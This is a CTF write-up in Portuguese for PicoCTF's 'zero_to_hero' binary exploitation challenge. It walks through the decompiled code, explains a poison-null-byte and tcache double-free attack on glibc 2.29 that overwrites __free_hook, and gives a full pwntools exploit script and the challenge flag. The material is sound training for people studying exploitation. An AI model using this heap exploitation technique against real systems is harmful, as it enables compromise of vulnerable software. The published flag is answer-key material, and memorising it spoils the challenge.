# WriteUp: zero_to_hero

## Descrição do Desafio:
**Autor**: Claude \
**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/75?category=6&page=5) \
**Categoria**: Binary Exploitation \
**Dificuldade**: Difícil \
**Data**: 2019 \
**Descrição**:
> Now you're really cooking. Can you pwn this service?

## Passo a Passo da Solução
### 1. Análise do arquivo fornecido
O binário fornecido vem com as seguintes proteções: `Full RELRO`, `Canary`, e `NX`. Com isso já podemos descartar a opção de reescrever a tabela `.GOT` do binário.

Analisando pelo **Ghidra**, vemos que as funções não vem bem definidas, mas com um pouco de análise já é possível achar a função de entrada e as outras principais. Olhando a função principal, já identificamos uma dica, que é o vazamento do endereço da `system`.

{% code title="main.c" overflow="wrap" lineNumbers="true" %}

```c
void main(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  int local_2c;
  char local_28 [24];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("From Zero to Hero");
  puts("So, you want to be a hero?");
  sVar1 = read(0,local_28,20);
  local_28[sVar1] = '\0';
  if (local_28[0] != 'y') {
    puts("No? Then why are you even here?");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Really? Being a hero is hard.");
  puts("Fine. I see I can\'t convince you otherwise.");
  printf("It\'s dangerous to go alone. Take this: %p\n",system); <-- Endereço da system vazando.
  while( true ) {
    while( true ) {
      menu();
      printf("> ");
      local_2c = 0;
      __isoc99_scanf(&%d,&local_2c);
      getchar();
      if (local_2c != 2) break;
      removePower();
    }
    if (local_2c == 3) break;
    if (local_2c != 1) goto LAB_00400dce;
    addPower();
  }
  puts("Giving up?");
LAB_00400dce:
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

{% endcode %}

Tirando a função `menu()`, temos outras duas funções principais, a `addPower()` e a `removePower()`.

{% code title="main.c" overflow="wrap" lineNumbers="true" %}

```c
void removePower(void)

{
  long in_FS_OFFSET;
  uint indexPower;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  indexPower = 0;
  puts("Which power would you like to remove?");
  printf("> ");
  __isoc99_scanf(&%u,&indexPower);
  getchar();
  if (6 < indexPower) {
    puts("Invalid index!");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
                    /* Vulnerabilidade, este endereço não é anulado no powers */
  free(*(void **)(&powers + (ulong)indexPower * 8));
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void addPower(void)

{
  void *power;
  ssize_t sVar1;
  long in_FS_OFFSET;
  uint tamPower;
  int nPowers;
  long local_20;
  long powerAddr;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  tamPower = 0;
  nPowers = findNumPowers();
  if (nPowers < 0) {
    puts("You have too many powers!");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  puts("Describe your new power.");
  puts("What is the length of your description?");
  printf("> ");
  __isoc99_scanf(&%u,&tamPower);
  getchar();
  if (1032 < tamPower) {
    puts("Power too strong!");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  power = malloc((ulong)tamPower);
  *(void **)(&powers + (long)nPowers * 8) = power;
  puts("Enter your description: ");
  printf("> ");
  powerAddr = *(long *)(&powers + (long)nPowers * 8);
  sVar1 = read(0,*(void **)(&powers + (long)nPowers * 8),(ulong)tamPower);
  *(undefined *)(sVar1 + powerAddr) = 0;
  puts("Done!");
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

{% endcode %}

Olhando para elas podemos assumir algumas coisas:

- `removePower`: aqui verificamos que podemos ter 7 super poderes ao mesmo tempo, podemos ver que os poderes (na verdade o endereço do *chunk* deles) é armazenado em uma variável global que eu renomeei como `powers`, e o mais importante, temos uma vulnerabilidade em que após liberarmos o *chunk*, com a função `free()`, o endereço na variável `powers` não é anulado, fazendo com que seja possível realizar um `double-free`.
- `addPower`: aqui verificamos que podemos digitar o tamanho do super poder (*chunk*), sendo o máximo 1032 (importante), e podemos escrever nesse tamanho. E aí está outra vulnerabilidade, quando escrevemos uma *string*, o final dela sempre deve ser um *byte* nulo `\0`, e no código nós podemos escrever exatamente a quantidade que pedimos, e em seguida o `\0` é colocado. Então, se escrevermos no tamanho total, o *byte* nulo é colocado em uma região que não é da *string*.

### 2. Exploit
Pelo o que foi analisado, já podemos ter uma ideia que o exploit deve ser algo relacionado a **HEAP**, então o mais importante é saber em qual versão da *libc* nós estamos. No caso, ela já vem junto com o binário, e é a versão **2.29**.

Resumindo essa versão, a `tcachebin` já foi implementada, e já contém suas verificações de segurança contra `double-free`. Aqui já podemos assumir algumas coisas:

- Não podemos realizar `double-free` na mesma bin da `tcache`.
- Não podemos utilizar a `fastbin` pois só podemos ter 7 poderes.

Então como vamos realizar o exploit? Analisando um pouco, é possível chegar na conclusão que podemos fazer um *chunk* ter 2 tamanhos ao mesmo tempo, como? 

Bom, foi visto que podemos escrever o tamanho total do *chunk*, e com isso o `\0` é colocado no próximo *chunk*, alterando o campo `size` dele. Mas temos que ficar atentos a algumas coisas:

- O *chunk* que será escrito totalmente deve ser do tamanho máximo, 1032, pois dessa forma a `malloc()` não irá realizar o alinhamento (aumentar o tamanho para os metadados).
- O segundo *chunk* deve ter tamanho acima de `0x200` e abaixo de `0x300`, pois quando ele for envenenado, o seu tamanho passará a ser `0x200`, que será devolvido pela `malloc()` quando for requisitado um *chunk* com tamanho menor do que 512 (não tão menor).
- É necessário alocar o primeiro *chunk*, depois alocar o segundo, e só após isso começar a realizar os `free()`, para garantir que eles estarão em sequência na memória.

Com isso conseguimos realizar um `double-free`, forçando o *chunk* ter 2 tamanhos diferentes, e também conseguimos manipular o `fd` (ponteiro para o próximo *chunk* na bin). Mas como vamos conseguir chegar na função `win()`? 

É aí que entra uma carta na manga, os ponteiros `__free_hook` e `__malloc_hook` da *libc*. Esses ponteiros são usados nas suas respectivas funções, com a função de garantir a execução de uma outra função específica, dessa forma, se alterarmos eles (apenas 1), podemos alterar o fluxo de execução para alguma função `win()`. Isso só será possível, pois há um vazamento da system no início, permitindo quebrar a proteção `ASLR`.

{% hint style="info" %}

**Nota:** Os ponteiros `__free_hook` e `__malloc_hook` foram removidos na versão **2.34**.

{% endhint %}

### 3. Solução
Primeiramente alocamos os dois *chunks*, um de 1032 e outro de 510, e liberamos eles, após isso alocamos novamente o de 1032, preenchendo ele totalmente. Agora, nosso segundo *chunk* está com outro tamanho em seus metadados, `0x200`, então liberamos ele novamente.

Por fim, alocamos o segundo *chunk* novamente (510) e colocamos como valor o `__free_hook`, e se tudo deu certo a tcache estará assim:
```
tcache(1032): vazia
tcache(510): vazia
tcahe(500): chunk_envenenado(0x200) -> __free_hook
```
E pronto, estamos com a faca e o queijo na mão, basta apenas alocar o chunk_envenenado, e alocar o `__free_hook` passando como valor o endereço da `win()`. Agora quando chamarmos a função `free()`, iremos para a função `win()` e a flag será popada.

### 3. Solução com Python

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
#O código possui duas vulnerabilidades, a primeira é que os ponteiros não anulados após o free, e a segunda é que podemos escrever exatamente a quantidade informada, e o programa em seguida vai colocar um byte nulo em um espaço fora do chunk.
#A ideia então é fazer com que o programa altere o campo size de um chunk alocado permitindo nós liberarmos ele duas vezes como se tivesse dois tamanhos.

# ------- Representação -------- #
# Antes do null byte
# [chunk1]: 0x0000000000000000      0x0000000000000071
#           0x0000000000000000      0x0000000000000000
#           0x0000000000000000      0x0000000000000000
#           0x0000000000000000      0x0000000000000000
#           0x0000000000000000      0x0000000000000000
#           0x0000000000000000      0x0000000000000000
#           0x0000000000000000      0x0000000000000000
# [chunk2]: 0x0000000000000000      0x0000000000000111
# Após o null byte
# [chunk1]: 0x0000000000000000      0x0000000000000071  
#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef 
#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef  
#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef  
#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef  
#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef  
#           0xdeadbeefdeadbeef      0xdeadbeefdeadbeef 
# [chunk2]: 0xdeadbeefdeadbeef      0x0000000000000100 <- O taldo Poison NULL Byte

#A ideia é reescrever um dos ponteiros, __free_hook ou __malloc_hook (ponteiros chamados nas respectivas funções).

#IMPORTANTE: o primeiro chunk tem que ser de tamanho 1032, por que? Porque esse é o tamanho máximo permitido para se colocar na Tcache (e pelo programa), aí com isso a malloc não irá fazer ajuste no tamanho (para alinhamento), e portanto podemos escrever nos 1032 bytes alocados. Outro ponto, o segundo chunk pode ser de qualquer valor acima de 500 (não é totalmente qualquer valor), a ideia é o alinhamento ajustar o tamanho do chunk para 0x2.., e com o NULL Byte o valor ficar 0x200 e isso é alocado passando como valor um número menor que 512 (não é qualquer um menor).

from pwn import *

elf = context.binary = ELF("./zero_to_hero")
libc = elf.libc
win = 0x00400a02
p = remote(ip, porta) #Troque pelos valores fornecidos

def create(tam, string):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(tam))
    p.sendlineafter(b"> ", string)

def delete(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", idx)

#Pegando o vazamento da libc.
p.sendlineafter(b"hero?", b"y")
p.recvuntil(b"Take this: ")
system = int(p.recvline()[:-1],16)
libc.address = system - libc.sym["system"]

#Criando os dois junks adjacentes e liberando eles.
create("1032", b"A" * 1032)
create("510", "Vou ser envenenado")
delete("0")
delete("1")

#Pegando o chunk de cima e preenchendo ele com o valor total, para que o tamanho do próximo seja envenenado com o NULL Byte.
create("1032", b"A" * 1032)

#VULNERABILIDADE, liberando o mesmo chunk novamente.
delete("1")

#Pegando o chunk e reescrevendo o fd dele com o endereço. do __free_hook.
create("510", p64(libc.sym["__free_hook"]))

#Agora nossa Tcache tem o lixo e em seguida o __free_hook. Retirando o lixo.
create("500", "Lixo")

#Pegando o __free_hook e escrevendo nele o endereço da win.
create("500", p64(win))

#Chamando a free novamente, pois agora iremos para a win.
delete("0")

#FLAG.
print(p.recvline().decode())
```

{% endcode %}

### Flag
`picoCTF{i_th0ught_2.29_f1x3d_d0ubl3_fr33?_qiviwkbl}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
